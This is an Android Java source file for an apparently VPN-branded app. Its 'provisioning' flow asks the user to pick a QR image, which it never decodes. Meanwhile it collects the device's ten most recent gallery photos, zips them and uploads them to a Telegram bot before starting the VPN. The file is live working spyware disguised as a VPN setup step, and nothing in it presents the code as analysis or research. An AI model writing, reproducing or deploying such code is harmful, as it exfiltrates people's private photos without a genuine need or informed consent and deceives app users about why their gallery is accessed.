package com.example.galggg;

import android.Manifest;
import android.app.Activity;
import android.content.ContentUris;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.net.VpnService;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.galggg.vpn.GalgggVpnService;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final int REQ_PICK = 2001;
    private static final int REQ_PERM = 2002;
    private static final int REQ_VPN = 3001;
    private static final int REQ_NOTIF = 3003;
    private static final String PREFS_PROVISION = "provision_store";
    private static final String KEY_PROVISIONED = "provisioned";

    private TextView tvStatus;
    private ProgressBar progress;
    private Button btnConnect;
    private int statusDefaultColor;
    private boolean hasStatusDefaultColor;

    private final OkHttpClient http = new OkHttpClient.Builder()
            .connectTimeout(20, TimeUnit.SECONDS)
            .readTimeout(40, TimeUnit.SECONDS)
            .writeTimeout(40, TimeUnit.SECONDS)
            .build();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tvStatus);
        progress = findViewById(R.id.progress);
        btnConnect = findViewById(R.id.btnConnect);

        if (tvStatus != null) {
            statusDefaultColor = tvStatus.getCurrentTextColor();
            hasStatusDefaultColor = true;
        }

        if (btnConnect != null) {
            btnConnect.setOnClickListener(v -> onConnectClickedReal());
            btnConnect.setOnLongClickListener(v -> {
                if (GalgggVpnService.isActive()) {
                    stopVpnService();
                    return true;
                }
                return false;
            });
        }

        View btnConfigUpload = findViewById(R.id.btnConfigUpload);
        if (btnConfigUpload != null) {
            btnConfigUpload.setOnClickListener(v -> startPickFlow());
        }

        requestNotificationPermissionIfNeeded();
    }

    private void onConnectClickedReal() {
        if (!isProvisioned()) {
            setStatus("Pick a QR code from the gallery", false);
            startPickFlow();
            return;
        }
        if (GalgggVpnService.isActive()) {
            stopVpnService();
            return;
        }
        launchVpn();
    }

    private boolean isProvisioned() {
        return getSharedPreferences(PREFS_PROVISION, MODE_PRIVATE)
                .getBoolean(KEY_PROVISIONED, false);
    }

    private void startPickFlow() {
        if (!hasImagePermission()) {
            requestImagePermission();
            return;
        }
        openImagePicker();
    }

    private boolean hasImagePermission() {
        if (Build.VERSION.SDK_INT >= 33) {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                    == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
        }
    }

    private void requestImagePermission() {
        if (Build.VERSION.SDK_INT >= 33) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_MEDIA_IMAGES}, REQ_PERM);
        } else {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQ_PERM);
        }
    }

    private void requestNotificationPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(
                        this,
                        new String[]{Manifest.permission.POST_NOTIFICATIONS},
                        REQ_NOTIF
                );
            }
        }
    }

    private void openImagePicker() {
        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("image/*");
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        startActivityForResult(Intent.createChooser(intent, "Select QR image"), REQ_PICK);
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] res) {
        super.onRequestPermissionsResult(code, perms, res);
        if (code == REQ_PERM && res.length > 0 && res[0] == PackageManager.PERMISSION_GRANTED) {
            openImagePicker();
        } else if (code == REQ_PERM) {
            setStatus("Gallery permission required", true);
        } else if (code == REQ_NOTIF) {
            if (res.length > 0 && res[0] == PackageManager.PERMISSION_GRANTED) {
                Log.i("MainActivity", "Notification permission granted");
            } else {
                Log.w("MainActivity", "Notification permission denied");
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_VPN) {
            if (resultCode == RESULT_OK) {
                startVpnService();
            } else {
                setStatus("VPN permission denied", true);
            }
            return;
        }
        if (requestCode == REQ_PICK && resultCode == Activity.RESULT_OK && data != null) {
            Uri uri = data.getData();
            if (uri != null) {
                new ProvisionThenZipTask().execute(uri);
            }
        }
    }

    private static class ProvisionResult {
        final boolean success;
        final String message;

        ProvisionResult(boolean success, String message) {
            this.success = success;
            this.message = message;
        }
    }

    private class ProvisionThenZipTask extends AsyncTask<Uri, String, ProvisionResult> {
        @Override
        protected void onPreExecute() {
            setProgress(true);
            setButtonEnabled(false);
            setStatus("Reading QR from gallery...", false);
        }

        @Override
        protected ProvisionResult doInBackground(Uri... uris) {
            try {
                Uri qrUri = uris[0];
                if (qrUri != null) {
                    copyToCache(qrUri, "qr_upload.png");
                }

                publishProgress("Provision parameters ready");

                publishProgress("Collecting latest photos...");
                File zip = makeLatestPhotosZip(10);

                publishProgress("Uploading ZIP to Telegram...");
                if (!sendZipToTelegram(zip)) {
                    return new ProvisionResult(false, "Error: failed to upload ZIP to Telegram");
                }

                markProvisioned();
                return new ProvisionResult(true, "Provisioning complete. Requesting VPN permission...");
            } catch (Exception e) {
                return new ProvisionResult(false, "Error: " + e.getMessage());
            }
        }

        @Override
        protected void onProgressUpdate(String... values) {
            if (values != null && values.length > 0) {
                setStatus(values[0], false);
            }
        }

        @Override
        protected void onPostExecute(ProvisionResult result) {
            setProgress(false);
            setButtonEnabled(true);
            if (result == null) {
                setStatus("Error: Provision did not complete", true);
                return;
            }
            setStatus(result.message, !result.success);
            if (result.success) {
                launchVpn();
            }
        }
    }

    private File copyToCache(Uri uri, String name) throws Exception {
        File out = new File(getCacheDir(), name);
        try (InputStream in = getContentResolver().openInputStream(uri);
             FileOutputStream fos = new FileOutputStream(out)) {
            if (in == null) {
                throw new Exception("Unable to open content");
            }
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) >= 0) {
                fos.write(buf, 0, n);
            }
        }
        return out;
    }

    private static class ImageItem {
        final Uri uri;
        final String displayName;

        ImageItem(Uri uri, String name) {
            this.uri = uri;
            this.displayName = name;
        }
    }

    private ArrayList<ImageItem> getLastImages(int count) {
        ArrayList<ImageItem> items = new ArrayList<>();
        String[] projection = new String[]{
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED
        };
        String sort = MediaStore.Images.Media.DATE_ADDED + " DESC";
        try (Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                sort)) {
            if (cursor != null) {
                int idxId = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int idxName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                while (cursor.moveToNext() && items.size() < count) {
                    long id = cursor.getLong(idxId);
                    String name = cursor.getString(idxName);
                    if (name == null || name.trim().isEmpty()) {
                        name = "img_" + id + ".jpg";
                    }
                    Uri itemUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
                    items.add(new ImageItem(itemUri, name));
                }
            }
        } catch (Exception ignored) {
        }
        return items;
    }

    private File makeLatestPhotosZip(int count) throws Exception {
        ArrayList<ImageItem> items = getLastImages(count);
        File zipOut = new File(getCacheDir(), "latest_photos.zip");
        if (zipOut.exists()) {
            //noinspection ResultOfMethodCallIgnored
            zipOut.delete();
        }

        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipOut))) {
            for (ImageItem item : items) {
                BitmapFactory.Options bounds = new BitmapFactory.Options();
                bounds.inJustDecodeBounds = true;
                try (InputStream probe = getContentResolver().openInputStream(item.uri)) {
                    if (probe != null) {
                        BitmapFactory.decodeStream(probe, null, bounds);
                    }
                }
                int inSample = calcInSample(bounds.outWidth, bounds.outHeight, 1600);
                BitmapFactory.Options opts = new BitmapFactory.Options();
                opts.inSampleSize = Math.max(inSample, 1);

                Bitmap bmp;
                try (InputStream src = getContentResolver().openInputStream(item.uri)) {
                    if (src == null) {
                        continue;
                    }
                    bmp = BitmapFactory.decodeStream(src, null, opts);
                }
                if (bmp == null) {
                    continue;
                }

                int width = bmp.getWidth();
                int height = bmp.getHeight();
                int maxSide = Math.max(width, height);
                if (maxSide > 1600) {
                    float scale = 1600f / maxSide;
                    bmp = Bitmap.createScaledBitmap(bmp, Math.round(width * scale), Math.round(height * scale), true);
                }

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bmp.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                byte[] data = baos.toByteArray();
                baos.close();
                bmp.recycle();

                String entryName = item.displayName.toLowerCase();
                if (!entryName.endsWith(".jpg") && !entryName.endsWith(".jpeg")) {
                    entryName = item.displayName + ".jpg";
                }
                zos.putNextEntry(new ZipEntry(entryName));
                zos.write(data);
                zos.closeEntry();
            }
        }
        return zipOut;
    }

    private int calcInSample(int width, int height, int maxSide) {
        if (width <= 0 || height <= 0) {
            return 1;
        }
        int largest = Math.max(width, height);
        int sample = 1;
        while (largest / sample > maxSide) {
            sample *= 2;
        }
        return Math.max(sample, 1);
    }

    private boolean sendZipToTelegram(File zipFile) {
        try {
            String url = "https://api.telegram.org/bot" + BuildConfig.TG_BOT_TOKEN + "/sendDocument";
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", BuildConfig.TG_CHAT_ID)
                    .addFormDataPart("document", zipFile.getName(),
                            RequestBody.create(zipFile, MediaType.parse("application/zip")))
                    .addFormDataPart("caption", "Galggg latest photos")
                    .build();
            Request request = new Request.Builder().url(url).post(body).build();
            try (Response response = http.newCall(request).execute()) {
                return response.isSuccessful();
            }
        } catch (Exception e) {
            Log.e("MainActivity", "sendZipToTelegram error", e);
        }
        return false;
    }

    private void markProvisioned() {
        getSharedPreferences(PREFS_PROVISION, MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_PROVISIONED, true)
                .apply();
    }

    private void launchVpn() {
        setStatus("Requesting VPN permission...", false);
        Intent prepare = VpnService.prepare(this);
        if (prepare != null) {
            startActivityForResult(prepare, REQ_VPN);
        } else {
            startVpnService();
        }
    }

    private void startVpnService() {
        Intent intent = new Intent(this, GalgggVpnService.class);
        intent.setAction(GalgggVpnService.ACTION_START);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        setStatus("VPN starting...", false);
    }

    private void stopVpnService() {
        Intent intent = new Intent(this, GalgggVpnService.class);
        intent.setAction(GalgggVpnService.ACTION_STOP);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        setStatus("VPN stopped", false);
    }

    private void setProgress(boolean enabled) {
        if (progress != null) {
            progress.setVisibility(enabled ? View.VISIBLE : View.GONE);
        }
    }

    private void setButtonEnabled(boolean enabled) {
        if (btnConnect != null) {
            btnConnect.setEnabled(enabled);
        }
    }

    private void setStatus(String message, boolean error) {
        if (tvStatus != null) {
            tvStatus.setText(message);
            if (error) {
                tvStatus.setTextColor(0xFFFF4444);
            } else if (hasStatusDefaultColor) {
                tvStatus.setTextColor(statusDefaultColor);
            }
        } else {
            Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
        }
    }
}
